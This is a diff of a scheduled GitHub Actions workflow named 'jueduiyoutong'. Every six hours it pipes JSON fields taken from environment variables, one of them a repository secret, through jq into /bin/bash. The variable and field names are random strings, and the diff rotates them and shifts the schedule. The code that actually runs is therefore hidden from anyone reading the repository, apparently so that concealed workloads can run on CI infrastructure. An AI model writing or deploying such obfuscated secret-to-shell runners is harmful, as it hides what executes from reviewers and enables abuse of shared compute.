@@ -3,27 +3,25 @@ name: jueduiyoutong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 3/6 * * *'
-jobs:  # 13126
+    - cron: '21 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jueduiyoutong
         env:
-          sezg21984: ${{ secrets.sezg21984 }}
+          zd46: ${{ secrets.zd46 }}
         run: |
-          echo $sezg21984 | jq -r .asd96 | /bin/bash
-          echo $jf3752 | jq -r .k34304 | /bin/bash
-          echo $vs41404 | jq -r .rfzg69689 | /bin/bash
-          echo $w3397 | jq -r .frzvh778 | /bin/bash
-          echo $jgo6 | jq -r .hfhsy65544 | /bin/bash
-          echo $wp8 | jq -r .jxcwf51 | /bin/bash
-          echo $g7049 | jq -r .vz6457 | /bin/bash
-          echo $ot678 | jq -r .sy20262 | /bin/bash
-          echo $xfhms30 | jq -r .ws3 | /bin/bash
-          echo $wsjv37047 | jq -r .ti73 | /bin/bash
-          echo $dlx64 | jq -r .yquz6609 | /bin/bash
-          echo $ypuw4 | jq -r .mpfao35754 | /bin/bash
-          echo $f0 | jq -r .xw88724 | /bin/bash
+          echo $zd46 | jq -r .r237 | /bin/bash
+          echo $zsfm1 | jq -r .sx4264 | /bin/bash
+          echo $cpqy4 | jq -r .zqa0923 | /bin/bash
+          echo $ual24670 | jq -r .uw5120 | /bin/bash
+          echo $l04 | jq -r .bc52 | /bin/bash
+          echo $ddboq8 | jq -r .bdqlx44711 | /bin/bash
+          echo $pj9393 | jq -r .auf9145 | /bin/bash
+          echo $yi6 | jq -r .oql89953 | /bin/bash
+          echo $m6789 | jq -r .ezh2349 | /bin/bash
+          echo $xt38623 | jq -r .msnc02537 | /bin/bash
+          echo $dxjt8416 | jq -r .oah8 | /bin/bash
 
